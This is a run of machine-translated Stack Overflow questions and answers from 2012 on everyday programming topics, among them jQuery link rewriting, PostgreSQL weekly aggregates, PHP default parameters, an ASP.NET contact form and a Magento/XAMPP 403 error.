        // TODO Auto-generated method stub
        return false;
    } 
```

}

请你告诉我如何异步获取我的当前位置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T08:47:56.113

```
LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);

intent = new Intent(LegalSeeFoods.this, MapDemoActivity.class);
intent.putExtra("lat", location .latitude);
intent.putExtra("long", location .longitude);
startActivity(intent); 
```

**在**MapDemoActivity.class

 **`mapView.getController().setCenter(point);` **<---**动画到位置**

# c# - 选项卡式 UI windows phone

> ID：10597097
> 
> 赞同：0
> 
> 时间：2012-05-15T08:43:46.603
> 
> 标签：c#, windows-phone-7, windows-phone-7.1

我想在 Windows Phone 应用程序的单页中创建一个选项卡式 UI。

最接近的示例是 MS Office 的选项卡式 UI。

当我点击一个选项卡（也可以是一个按钮）时，`stackpanel`下面的可用按钮应该会改变。

实现这一目标的最佳方法是什么？我在 1 个面板中有很多按钮，并且有很多 tabe(3-4)。因此，手动分配不是一种选择。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T08:49:11.643

选项卡式 UI 控件的 Windows Phone 等效项是[Pivot 控件](http://msdn.microsoft.com/en-us/library/ff941123%28v=vs.92%29.aspx)。

在下面的示例中（取自[PicFx - Windows Phone 图片效果应用程序 - 第 1 部分](http://channel9.msdn.com/coding4fun/articles/PicFx--Windows-Phone-Picture-Effects-Application--Part-1)），有两个“选项卡”（或枢轴项）：**图片**和**效果**。

![枢轴控制](../Images/2edff140161c2418cbaa3239f10b0a22.png)

# javascript - 替换某些链接的扩展名

> ID：10597098
> 
> 赞同：0
> 
> 时间：2012-05-15T08:43:49.110
> 
> 标签：javascript, jquery, replace, hyperlink, href

我有一个数组，其中包括一些页面：

```
var pages = ['test', 'blabla', 'xyz']; 
```

我的文档包含一些这样的链接：

```
<a href="test.php">tes</a>
<a href="blabla.php">blabla</a>
<a href="xyz.php">xyz</a>
<a href="stackoverflow.php">test2</a> 
```

我想要的是以下内容：

我想搜索整个文档并找到所有以我的数组中的单词开头的链接。然后，我想用“.html”替换“.php”并将当前 URL（不包括文件）添加到它们：

```
location.href.substring(0,location.href.lastIndexOf('/')+1) 
```

所以，预期的结果应该是这样的：

```
<a href="file:///C:/test.html">test</a>
<a href="file:///C:/blabla.html">blabla</a>
<a href="file:///C:/xyz.html">xyz</a>
<a href="stackoverflow.php">xyz</a> 
```

我尝试的是这样的：

```
$(function(){
var pages = ['test', 'blabla', 'xyz'];
$.each(pages, function(index, value) {
$("a[href='" + value + ".php']").attr("href", location.href.substring(0,location.href.lastIndexOf('/')+1) + $("a[href='" + value + ".php']").attr("href").replace('php', 'html'));
});
}); 
```

这有效，但并非总是如此。我在一个更大的文档中尝试了这个，它以这个错误结束：

> $("a[href='" + value + ".php']").attr("href") 未定义

我想，有一种更简单、更好、更兼容的方式。但我不知道，这就是我在这里问的原因：D

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:46:18.910

```
var pages = ['test', 'blabla', 'xyz'];   
$('a[href$=".php"]').each(function() {
  var hrefWithoutext = this.href.replace('.php','');
  if($.inArray(hrefWithoutext, pages)){
    this.href = 'file:///C:/' + hrefWithoutext + '.html';
  }
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T08:59:06.593

```
var pages = ['test', 'blabla', 'xyz'];
$.each(pages, function (index, value) {
    $('a[href$=' + value + '.php]').attr("href", function () {
        return ('file:///C:/' + $(this).attr('href').replace('.php', '.html'));
    });
}); 
```

# sql - 每周总金额

> ID：10597101
> 
> 赞同：1
> 
> 时间：2012-05-15T08:43:54.297
> 
> 标签：sql, postgresql, aggregate-functions, date-range

我在 PostgreSQL 数据库中有一个表，其中包含日期和每天的总数。

```
我的日期总计
2012-05-12 12
2012-05-14 8
2012-05-13 4
2012-05-12 12
2012-05-15 2
2012-05-17 1
2012-05-18 1
2012-05-21 1
2012-05-25 1

```

现在我需要获取给定日期范围内的每周总计。
前任。我想从`2012-05-01`最多获得每周总计`2012-05-31`。

我正在看这个输出：

```
2012-05-01 2012-05-07 0
2012-05-08 2012-05-14 36
2012-05-15 2012-05-22 5
2012-05-23 2012-05-29 1
2012-05-30 2012-05-31 0

```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:28:10.090

这适用于*任何*给定的日期范围：

```
CREATE FUNCTION f_tbl_weekly_sumtotals(_range_start date, _range_end date)
  RETURNS TABLE (week_start date, week_end date, sum_total bigint)
  LANGUAGE sql AS
$func$
SELECT w.week_start, w.week_end, COALESCE(sum(t.total), 0)
FROM  (
   SELECT week_start::date, LEAST(week_start::date + 6, _range_end) AS week_end
   FROM   generate_series(_range_start::timestamp
                        , _range_end::timestamp
                        , interval '1 week') week_start
   ) w
LEFT   JOIN tbl t ON t.mydate BETWEEN w.week_start and w.week_end
GROUP  BY w.week_start, w.week_end
ORDER  BY w.week_start
$func$; 
```

称呼：

```
SELECT * FROM f_tbl_weekly_sumtotals('2012-05-01', '2012-05-31'); 
```

### 要点

*   为方便起见，我将其包装在一个函数中，因此日期范围只需提供一次。

*   子查询`w`生成从给定日期范围的第一天开始的一系列星期。上限被限制`LEAST`在给定日期范围的上限内。

*   然后`LEFT JOIN`到数据表（`tbl`在我的示例中）以保留结果中的*所有*周，即使没有找到数据行。

*   其余的应该是显而易见的。`COALESCE`输出`0`而不是`NULL`空周。

*   `mydate date`我假设并且`total int`由于缺乏信息，数据类型必须匹配。（`sum()`an 的`int`是`bigint`。）

*   解释我的特殊用途`generate_series()`：

    *   [在 PostgreSQL 中生成两个日期之间的时间序列](https://stackoverflow.com/questions/14113469/generating-time-series-between-two-dates-in-postgresql/46499873#46499873)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:30:57.373

使用此[功能](http://wiki.postgresql.org/wiki/Date_LastDay)

```
CREATE OR REPLACE FUNCTION last_day(date)
RETURNS date AS
$$
  SELECT (date_trunc('MONTH', $1) + INTERVAL '1 MONTH - 1 day')::date;
$$ LANGUAGE 'sql' IMMUTABLE STRICT; 
```

AND generate_series（从 8.4 开始）我们可以创建日期分区。

```
SELECT wk.wk_start, 
       CAST(
            CASE (extract(month from wk.wk_start) = extract(month from wk.wk_start + interval '6 days'))
            WHEN true THEN wk.wk_start + interval '6 days'
            ELSE last_day(wk.wk_start)
            END 
           AS date) AS wk_end
  FROM
    (SELECT CAST(generate_series('2012-05-01'::date,'2012-05-31'::date,interval '1 week') AS date) AS wk_start) AS wk; 
```

然后把它和数据放在一起

```
CREATE TABLE my_tab(mydate date,total integer);
INSERT INTO my_tab 
values    
('2012-05-12'::date,12),
('2012-05-14'::date,8),
('2012-05-13'::date,4),
('2012-05-12'::date,12),
('2012-05-15'::date,2),
('2012-05-17'::date,1),
('2012-05-18'::date,1),
('2012-05-21'::date,1),
('2012-05-25'::date,1); 

WITH month_by_week AS
    (SELECT wk.wk_start, 
       CAST(
            CASE (extract(month from wk.wk_start) = extract(month from wk.wk_start + interval '6 days'))
            WHEN true THEN wk.wk_start + interval '6 days'
            ELSE last_day(wk.wk_start)
            END 
           AS date) AS wk_end
  FROM
    (SELECT CAST(generate_series('2012-05-01'::date,'2012-05-31'::date,interval '1 week') AS date) AS wk_start) AS wk
  )
SELECT month_by_week.wk_start,
       month_by_week.wk_end,
       SUM(COALESCE(mt.total,0))
  FROM month_by_week 
       LEFT JOIN my_tab mt ON  mt.mydate BETWEEN month_by_week.wk_start AND month_by_week.wk_end
 GROUP BY month_by_week.wk_start,
          month_by_week.wk_end
 ORDER BY month_by_week.wk_start; 
```

# linux-kernel - 克隆系统调用中的子堆栈解释

> ID：10597104
> 
> 赞同：0
> 
> 时间：2012-05-15T08:43:59.500
> 
> 标签：linux-kernel, clone, system-calls

在克隆 (2) 手册页中，对于子堆栈，它提到了

```
Since the child and calling process may share memory, it is not possible for the child 
process to execute in the same stack as the calling process. 
```

任何人都可以解释一下“共享内存”是如何使它变得不可能的。OTOH，一个普遍的看法是线程中的函数执行顺序会与其他线程不同，因此我们需要另一个堆栈。

谢谢，卡皮尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T08:52:49.823

两个线程不能使用同一个堆栈。他们只会把事情搞砸，很快就会崩溃。

使用时`fork`，没有内存共享。两个线程具有相同的堆栈指针值，但它指向物理上不同的内存页。

使用时`pthread_create`，为新线程选择一个新的堆栈指​​针，与父线程分开。这样他们就不会破坏彼此的堆栈。

`clone`是一个低级函数，介于两者之间。它保持内存共享，因此线程不能共享堆栈。但与 不同`pthread_create`的是，新的堆栈指​​针是由用户决定的，用户可以随意选择。你引用的那句话警告你应该谨慎选择它。

# matlab - OpenCV函数类似于matlab的“查找”

> ID：10597107
> 
> 赞同：8
> 
> 时间：2012-05-15T08:44:15.353
> 
> 标签：matlab, opencv

我正在寻找 openCV 中的函数来帮助我制作图像蒙版。

例如在 MATLAB 中：

B(A<1)=0；

或者

B=零（大小（A））；

B(A==10)=c;

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-15T10:11:40.967

有些函数允许您向它们传递`mask`参数。要按照您描述的方式创建掩码，我认为您是在比较运算符[Cmp 或 CmpS](http://opencv.willowgarage.com/documentation/python/core_operations_on_arrays.html#cmp)之后，允许您通过与另一个数组或标量进行比较来创建掩码。例如：

```
im = cv.LoadImageM('tree.jpg', cv.CV_LOAD_IMAGE_GRAYSCALE)
mask_im = cv.CreateImage((im.width, im.height), cv.IPL_DEPTH_8U, 1)
#Here we create a mask by using `greater than 100` as our comparison
cv.CmpS(im, 100, mask_im, cv.CV_CMP_GT)
#We set all values in im to 255, apart from those masked, cv.Set can take a mask arg.
cv.Set(im, 255, mask=mask_im)
cv.ShowImage("masked", im)
cv.WaitKey(0) 
```

原文`im`：

![在此处输入图像描述](../Images/eaf0b526b2de54d9da4837b9ad25a4f0.png)

`im`处理后：

![在此处输入图像描述](../Images/448627a28a106fef835b346e05cb9467.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-06T20:51:26.193

OpenCV C++ 支持以下语法，您可能会发现创建掩码很方便：

```
Mat B= A > 1;//B(A<1)=0 
```

或者

```
Mat B = A==10;
B *= c; 
```

这应该相当于：

```
B=zeros(size(A));
B(A==10)=c; 
```

您也可以使用`compare()`. 请参阅以下 OpenCV[文档](http://docs.opencv.org/modules/core/doc/operations_on_arrays.html#compare)。

# asp.net - 如何让这个 asp.net 电子邮件进入数据库？

> ID：10597110
> 
> 赞同：0
> 
> 时间：2012-05-15T08:44:26.070
> 
> 标签：asp.net, database, vb.net, visual-studio, visual-studio-2010

我有一个联系表格（VS 2010 / VB / .net4），当客户填写表格时，我会收到一封电子邮件——我喜欢，但是....

例如，这是我收到的一封电子邮件：

> 电子邮件：ivy_league_alum-at-yahoo.com
> 
> 主题：你们会整合PPT吗？
> 
> 留言：我正在寻找密歇根地区的PPT集成商。
> 
> 名字：蒂姆
> 
> 姓氏：杜瓦
> 
> 组织：美国车桥
> 
> 浏览器：Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7
> 
> IP地址：184.60.79.96
> 
> 服务器日期和时间：2012 年 1 月 13 日上午 11:28:59

这只是一家产生潜在客户的公司，所以我们会收到很多电子邮件，我们会希望它们井井有条。

Jon P 建议我使用数据库来收集我收到的所有这些电子邮件，而不是 MS Excel（反正我不知道该怎么做）。所以我下载了 SQL Server Express。那么现在我该怎么办？有人可以告诉我我必须在代码中添加什么，或者我必须做什么，以便我可以有组织地收集这些电子邮件吗？谢谢！

附录（我知道这很长）：

具体来说，我的电子邮件代码是：

> <%@ Page Title="Contact Health Nutts" Language="VB" MasterPageFile="~/Site.master" AutoEventWireup="false" CodeFile="contact.aspx.vb" Inherits="contact" %> Protected Sub SubmitForm_Click( ByVal sender As Object, ByVal e As System.EventArgs) If Not Page.IsValid Then Exit Sub
> 
> ```
>  Dim SendResultsTo As String = "jason.weber-at-healthynutts.com"
>         Dim smtpMailServer As String = "smtp.healthynutts.com"
>         Dim smtpUsername As String = "jason.weber-at-healthynutts.com"
>         Dim smtpPassword As String = "********"
>         Dim MailSubject As String = "Form Results"
> 
>         Try
>             Dim txtQ As TextBox = Me.FormContent.FindControl("TextBoxQ")
>             If txtQ IsNot Nothing Then
>                 Dim ans As String = ViewState("hf1")
>                 If ans.ToLower <> txtQ.Text.ToLower Or ans.ToUpper <> txtQ.Text.ToUpper Then
>                     Me.YourForm.ActiveViewIndex = 3
>                     Exit Sub
>                 End If
>             End If
> 
>             Dim FromEmail As String = SendResultsTo
>             Dim msgBody As StringBuilder = New StringBuilder()
>             Dim sendCC As Boolean = False
> 
>             For Each c As Control In Me.FormContent.Controls
>                 Select Case c.GetType.ToString
>                     Case "System.Web.UI.WebControls.TextBox"
>                         Dim txt As TextBox = CType(c, TextBox)
>                         If txt.ID.ToLower <> "textboxq" Then
>                             msgBody.Append(txt.ID & ": " & txt.Text & vbCrLf & vbCrLf)
>                         End If
>                         If txt.ID.ToLower = "email" Then
>                             FromEmail = txt.Text
>                         End If
>                         If txt.ID.ToLower = "subject" Then
>                             MailSubject = txt.Text
>                         End If
>                     Case "System.Web.UI.WebControls.CheckBox"
>                         Dim chk As CheckBox = CType(c, CheckBox)
>                         If chk.ID.ToLower = "checkboxcc" Then
>                             If chk.Checked Then sendCC = True
>                         Else
>                             msgBody.Append(chk.ID & ": " & chk.Checked & vbCrLf & vbCrLf)
>                         End If
> 
>                     Case "System.Web.UI.WebControls.RadioButton"
>                         Dim rad As RadioButton = CType(c, RadioButton)
>                         msgBody.Append(rad.ID & ": " & rad.Checked & vbCrLf & vbCrLf)
>                     Case "System.Web.UI.WebControls.DropDownList"
>                         Dim ddl As DropDownList = CType(c, DropDownList)
>                         msgBody.Append(ddl.ID & ": " & ddl.SelectedValue & vbCrLf & vbCrLf)
>                 End Select
>             Next
>             msgBody.AppendLine()
> 
>             msgBody.Append("Browser: " & Request.UserAgent & vbCrLf & vbCrLf)
>             msgBody.Append("IP Address: " & Request.UserHostAddress & vbCrLf & vbCrLf)
>             msgBody.Append("Server Date & Time: " & DateTime.Now & vbCrLf & vbCrLf)
> 
>             Dim myMessage As System.Net.Mail.MailMessage = New System.Net.Mail.MailMessage()
>             myMessage.To.Add(SendResultsTo)
>             myMessage.From = New System.Net.Mail.MailAddress(FromEmail)
>             myMessage.Subject = MailSubject
>             myMessage.Body = msgBody.ToString
>             myMessage.IsBodyHtml = False
>             If sendCC Then myMessage.CC.Add(FromEmail)
> 
>             Dim basicAuthenticationInfo As New System.Net.NetworkCredential(smtpUsername, smtpPassword)
>             Dim MailObj As New System.Net.Mail.SmtpClient(smtpMailServer)
>             MailObj.Credentials = basicAuthenticationInfo
>             MailObj.Send(myMessage)
> 
>             Me.YourForm.ActiveViewIndex = 1
>         Catch
>             Me.YourForm.ActiveViewIndex = 2
>         End Try
>     End Sub
> 
>     Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
>         If Not Page.IsPostBack Then
>             Dim lbl As Label = Me.FormContent.FindControl("labelq")
>             If lbl IsNot Nothing Then
>                 Dim rq(3) As String
>                 rq(0) = "Is fire hot or cold?"
>                 rq(1) = "Is ice hot or cold?"
>                 rq(2) = "Is water wet or dry?"
> 
>                 Dim ra(3) As String
>                 ra(0) = "hot"
>                 ra(1) = "cold"
>                 ra(2) = "wet"
> 
>                 Dim rnd As New Random
>                 Dim rn As Integer = rnd.Next(0, 3)
>                 lbl.Text = rq(rn)
>                 ViewState("hf1") = ra(rn)
>             End If
>         End If
>     End Sub
> </script> </asp:Content> <asp:Content ID="Content2" ContentPlaceHolderID="MainContent" Runat="Server"> <h1>CONTACT HEALTH 
> ```
> 
> 在自己舒适的家中疯狂工作！
> 
> 输入您的电子邮件地址：
> * 必填 * 请输入有效的电子邮件地址。
> 
> 主题：
> * 必填
> 
> 请在下面输入您的信息： * 必填
> 
> 名字：
> * 必填
> 
> 姓氏：
> * 必填
> 
> 电话号码：
> * 必填 * 请输入有效的美国电话号码（包括破折号）。
> 
> 城市：
> * 要求的
> 
> 州/省：
> * 必填
> 
> 您的信息已发送。感谢您与我们联系。
> 由于技术困难，您的消息可能尚未发送。您没有正确回答反垃圾邮件问题。请返回重试。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:18:38.873

不要采取错误的方式，但从你所说的缺乏编码能力来看，让其他人为你工作可能会更便宜。一个称职的编码人员应该能够在大约一个小时内为您敲出一些东西，如果他不停下来喝咖啡，可能会更少。

如果您真的真的想自己做，那么首先，您将不得不确定网站的托管包装是否包含数据库。

假设您不在本地计算机上托管网站，那么在您的计算机上安装 SQL Express 版本将有助于您开发代码，但您将无法部署它。

但是，完全忽略这一点，您要执行的步骤是：

1.  用SQL创建数据库，然后创建相关的数据库表
2.  使用 ADO.Net 创建从网站到数据库的连接
3.  创建将联系表单数据插入数据库表的代码

然后，您需要考虑收集数据后将如何查看数据，因此您要么必须编写一些东西，要么学习 SQL。

如果您想要一些代码示例来帮助您开始工作，那么我们需要知道您使用的是什么语言（应该是 C# 或 VB.Net），并且发布联系表单的代码也会有所帮助（显然删除任何敏感的详细信息，例如用户名和密码）。

**编辑：**

创建数据库后，此脚本应为您提供 SQL Express 中的基本表结构：

```
CREATE TABLE [dbo].[tblEmails](
    [EmailID] [int] IDENTITY(1,1) NOT NULL,
    [EmailAddress] [nvarchar](200) NOT NULL,
    [Subject] [nvarchar](200) NOT NULL,
    [Message] [nvarchar](max) NOT NULL,
    [FirstName] [nvarchar](50) NOT NULL,
    [LastName] [nvarchar](50) NOT NULL,
    [PhoneNumber] [nvarchar](20) NOT NULL,
    [City] [nvarchar](50) NOT NULL,
    [State] [nvarchar](50) NOT NULL,
 CONSTRAINT [PK_tblEmails2] PRIMARY KEY CLUSTERED 
(
    [EmailID] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]

GO 
```

要使用它，请右键单击 SQL Express 中的数据库，单击新建查询，将上面的内容粘贴到窗口中，然后单击执行按钮，刷新数据库，您应该不会看到该表。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T08:50:44.017

如果您也使用 ajax，这里是一个很好的教程。

[http://dotnetslackers.com/articles/aspnet/Developing-an-AJAX-and-ASP-NET-4-0-Based-Online-E-mail-System-Part1.aspx](http://dotnetslackers.com/articles/aspnet/Developing-an-AJAX-and-ASP-NET-4-0-Based-Online-E-mail-System-Part1.aspx)

# syslog - 使用 rsyslog 将 syslog 消息存储到 MySQL

> ID：10597112
> 
> 赞同：0
> 
> 时间：2012-05-15T08:44:30.610
> 
> 标签：syslog, rsyslog

我需要将 Syslog 消息存储到我的一个应用程序的 MySQL 等数据库中。但我只想存储那些包含特定模式的消息。我不想存储所有记录到 Syslog 的行。是否可以在 rsyslog 配置中指定过滤某些消息的正则表达式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T04:51:55.100

在互联网上进行了一些搜索后，我找到了一篇关于如何将正则表达式与 rsyslog 一起使用的好文章。文章的链接是： [http ://www.rsyslog.com/regex/](http://www.rsyslog.com/regex/)

基本上 rsyslog 使用 POSIX ERE 表达式，上面的页面有助于为 rsyslog 守护进程编写正则表达式，可以包含在 rsyslog.conf 文件中。

# php - PHP默认函数参数值，如何为“不是最后一个”参数“传递默认值”？

> ID：10597114
> 
> 赞同：48
> 
> 时间：2012-05-15T08:44:55.040
> 
> 标签：php, function, parameters, default

我们大多数人都知道以下语法：

```
function funcName($param='value'){
    echo $param;
}
funcName();

Result: "value" 
```

我们想知道如何传递“不是最后一个”参数的默认值？我知道这个术语已经过时了，但一个简单的例子是：

```
function funcName($param1='value1',$param2='value2'){
    echo $param1."\n";
    echo $param2."\n";
} 
```

我们如何完成以下任务：

```
funcName(---default value of param1---,'non default'); 
```

结果：

```
value1
not default 
```

希望这是有道理的，我们希望基本上假设不是最后一个参数的默认值。

谢谢。

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-05-15T08:53:08.873

PHP 不支持您尝试执行的操作。这个问题的通常解决方案是传递一个参数数组：

```
function funcName($params = array())
{
    $defaults = array( // the defaults will be overidden if set in $params
        'value1' => '1',
        'value2' => '2',
    );

    $params = array_merge($defaults, $params);

    echo $params['value1'] . ', ' . $params['value2'];
} 
```

示例用法：

```
funcName(array('value1' => 'one'));                    // outputs: one, 2
funcName(array('value2' => 'two'));                    // outputs: 1, two
funcName(array('value1' => '1st', 'value2' => '2nd')); // outputs: 1st, 2nd
funcName();                                            // outputs: 1, 2 
```

使用它，所有参数都是可选的。通过传递参数数组，数组中的任何内容都将覆盖默认值。这可以通过使用[`array_merge()`](http://php.net/manual/en/function.array-merge.php)which 合并两个数组，用第二个数组中的任何重复元素覆盖第一个数组来实现。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-05-15T08:50:37.547

不幸的是，这是不可能的。为了解决这个问题，我建议在您的函数中添加以下行：

```
$param1 = (is_null ($param1) ? 'value1' : $param1); 
```

然后你可以这样称呼它：

```
funcName (null, 'non default');

Result:

value1
non default 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2020-09-25T23:20:37.767

**PHP 8.0 更新**

自 PHP 8.0 起提供您想要的解决方案：[命名参数](https://wiki.php.net/rfc/named_params)

```
function funcName($param1 = 'value1', $param2 = 'value2', $param3 = 'value3') {
    ...
} 
```

以前您必须将一些值作为 传递`$param1`，null 或默认值，但现在您只能传递第二个参数。

```
funcName(param2: 'value'); 
```

而且您不需要关心参数顺序。

```
funcName(param2: 'value', param3: 'value');

//is the same as

funcName(param3: 'value', param2: 'value'); 
```

* * *

此外，我们可以用命名参数做一些花哨的事情，比如将数组作为参数传递。当我们不知道我们将哪些确切的键存储在数组中并且我们不再需要担心变量的顺序时，这很有帮助。

```
$args = [
    'param3' => 'value',
    'param2' => 'value',
];

funcName(...$args);

//works the same as

funcName(param2: 'value', param3: 'value'); 
```

* * *

我们甚至不需要将数组中的值命名为参数（当然，直到我们匹配参数的顺序）。

```
$args = [
    'value1',
    'param3' => 'value3',
    'param2' => 'value2',
];

funcName(...$args);

//works the same as

funcName(param1: 'value1', param3: 'value3', param2: 'value2');

//and

funcName('value1', 'value2', 'value3'); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-12-01T20:27:15.120

您的问题的简单解决方案是，而不是使用：

```
funcName(---default value of param1---,'non default'); 
```

使用以下语法：

```
funcName('non default',---default value of param1---); 
```

例子：

```
function setHeight2($maxheight,$minheight = 50) {
    echo "The MAX height is : $maxheight <br>";
    echo "The MIN height is : $minheight <br>";
}

setHeight2(350,250);
setHeight2(350); // will use the default value of 50 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-06-17T16:22:49.080

您可以使用`'_'`来引用未定义的常量并在此之后继续传递变量。

例如（从您的示例扩展）：

```
function funcName($param1='value1',$param2='value2'){
    echo $param1."\n";
    echo $param2."\n";
} 
```

像这样调用函数：

```
funcName('_','Some Pass value'); 
```

会输出这个：

```
value1
Some Pass value 
```

# actionscript-3 - URLLoader 奇怪的行为 - 标头中的 \r\n 不正确

> ID：10597116
> 
> 赞同：1
> 
> 时间：2012-05-15T08:45:05.443
> 
> 标签：actionscript-3, http, header, urlloader

我遇到了 URLLoader/URLRequest 的一个非常奇怪的行为。看看下面的代码：

```
var loader:URLLoader   = new URLLoader();
loader.dataFormat = URLLoaderDataFormat.BINARY;

var request:URLRequest = new URLRequest(url);
request.method = URLRequestMethod.POST;

if (params.action is ByteArray) {
    params.action = Base64.encodeByteArray(params.action);
}

var vars:URLVariables = new URLVariables();
for (var paramName:String in params) {
    vars[paramName] = params[paramName];
} 
request.data = vars;

loader.load(request); 
```

当我检查 HTTP 原始请求时，我看到：

```
POST /actions/send/3882-fba04fd1db5b0ac4f4107dd06632e851 HTTP/1.1
Host: domainname.com
Content-Length: 237
Origin: http://anotherdomain.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.168 Safari/535.19
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://anotherdomain.com/page.html
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
Cookie: foo=bar
Pragma: no-cache
Cache-Control: no-cache

Content-type: application/x-www-form-urlencoded
Content-length: 165

action=BASE64DATABASE64DATABASE64DATABASE64DATABASE64DATABASE64DATABASE64DATA 
```

所以.. wtf？为什么 URLLoader在标头`\r\n`之后插入`Cache-Control: no-cache`？试图找到解决方案，但没有任何运气。

# jfreechart - jfreechart中的条形图百分比

> ID：10597127
> 
> 赞同：0
> 
> 时间：2012-05-15T08:45:54.903
> 
> 标签：jfreechart

我想要使​​用 jfreechart 的条形图中的值之后的百分比符号已经尝试了很多但没有得到正确的结果。在 jfreechart 中，他们给出了 barchart3ddemo 的百分比。我想要正常的条形图演示示例程序百分比符号请帮帮我..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T03:56:10.017

您可以使用您选择的渲染器`setSeriesItemLabelsVisible()`或`setBaseItemLabelsVisible()`方法来显示标签。如有必要，您可以自己提供，[此处](https://stackoverflow.com/a/8117844/230513)`CategoryItemLabelGenerator`提到。

# magento - Magento 禁止访问

> ID：10597128
> 
> 赞同：1
> 
> 时间：2012-05-15T08:45:55.503
> 
> 标签：magento, xampp

你能帮我么，

我正在尝试从 media/customer/ 文件夹访问直接图像文件，但它说的是

```
Access forbidden! 
```

您无权访问请求的对象。它要么是读保护的，要么是服务器不可读的。

如果您认为这是服务器错误，请联系网站管理员。

错误 403

本地主机 05/15/12 14:13:26 Apache/2.2.14 (Win32) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l mod_autoindex_color PHP/5.3.1 mod_apreq2-20090110/2.7.1 mod_perl/2.0.4 Perl/v5.10.1

任何帮助请！我知道，这不是 xampp 的错误，它来自 magento，请帮帮我

提前谢谢了

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:34:11.983

我敢怀疑，这条消息是由 Magento 制作的。

它看起来就像`xampp/apache/error/HTTP_FORBIDDEN.html.var`XAMPP 的默认设置：

```
Content-language: en
Content-type: text/html; charset=ISO-8859-1
Body:----------en--
<!--#set var="TITLE" value="Access forbidden!"
--><!--#include virtual="include/top.html" -->

  <!--#if expr="$REDIRECT_URL = /\/$/" -->

    You don't have permission to access the requested directory.
    There is either no index document or the directory is read-protected.

  <!--#else -->

   You don't have permission to access the requested object.
   It is either read-protected or not readable by the server.

  <!--#endif -->

<!--#include virtual="include/bottom.html" -->
----------en-- 
```

不幸的是，您没有写任何关于您的代码如何尝试访问图像的内容。

请张贴相关的代码部分。

请在 Apache 中找到正确的 403 消息`error_log`并将其发布。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-19T10:10:10.623

您应该检查媒体文件夹中的权限设置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T11:38:36.560

看起来安装 Magento 的目录没有访问 Magento 目录的权限。这是一个 Apache 错误，而不是 Magento 错误。

# iphone - 无法从包含数组数组并具有 DIctionaries 的 plist 文件中读取

> ID：10597133
> 
> 赞同：0
> 
> 时间：2012-05-15T08:46:03.820
> 
> 标签：iphone, objective-c

我创建了一个 plist 文件，其中包含一个包含另一个数组的单个数组。每个数组包含四个字典。我已经尝试了很多从 plist 文件中读取数据。但无法获取数据。我的 plist 文件的代码在这里

```
<plist version="1.0">
<dict>
<key>Root</key>
<array>
    <array>
        <dict>
            <key>name</key>
            <string>Czech Republic</string>
            <key>imagename</key>
            <string>czechrepublic.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Greece</string>
            <key>imagename</key>
            <string>greece.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Poland</string>
            <key>imagename</key>
            <string>poland.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Russia</string>
            <key>imagename</key>
            <string>russia.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
    </array>
    <array>
        <dict>
            <key>name</key>
            <string>Denmark</string>
            <key>imagename</key>
            <string>denmark.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Germany</string>
            <key>imagename</key>
            <string>germany.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Netherlands</string>
            <key>imagename</key>
            <string>netherlands.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Portugal</string>
            <key>imagename</key>
            <string>portugal.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
    </array>
    <array>
        <dict>
            <key>name</key>
            <string>Croatia</string>
            <key>imagename</key>
            <string>croatia.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Italy</string>
            <key>imagename</key>
            <string>italy.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Republic of Ireland</string>
            <key>imagename</key>
            <string>ireland.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Spain</string>
            <key>imagename</key>
            <string>spain.png</string>
            <key>url</key>
